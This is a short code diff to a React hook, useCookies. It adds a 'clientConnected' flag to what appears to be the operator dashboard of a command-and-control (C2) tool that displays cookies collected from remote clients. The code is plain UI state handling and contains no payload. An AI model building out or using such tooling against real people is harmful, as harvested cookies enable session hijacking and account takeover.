@@ -18,6 +18,8 @@ interface CookiesMessage {
 interface UseCookiesResult {
   cookies: CookieEntry[];
   status: "connecting" | "open" | "closed";
+  /** False when the client has disconnected from C2 (reset to true on next data message). */
+  clientConnected: boolean;
   /** Send a clear command to the server and optimistically reset local state. */
   clearCookies: () => void;
 }
@@ -35,6 +37,7 @@ interface UseCookiesResult {
  */
 export function useCookies(clientId: string): UseCookiesResult {
   const [cookies, setCookies] = useState<CookieEntry[]>([]);
+  const [clientConnected, setClientConnected] = useState(true);
 
   const wsUrl = useMemo(() => buildViewerWsUrl(clientId, "cookies"), [clientId]);
 
@@ -52,6 +55,8 @@ export function useCookies(clientId: string): UseCookiesResult {
       setCookies((prev) => [...prev, ...(msg.cookies ?? [])]);
     } else if (msg.type === "cleared") {
       setCookies([]);
+    } else if (msg.type === "disconnected") {
+      setClientConnected(false);
     }
   }, []);
 
@@ -62,5 +67,5 @@ export function useCookies(clientId: string): UseCookiesResult {
     setCookies([]); // Optimistic reset
   }, [send]);
 
-  return { cookies, status, clearCookies };
+  return { cookies, status, clientConnected, clearCookies };
 }
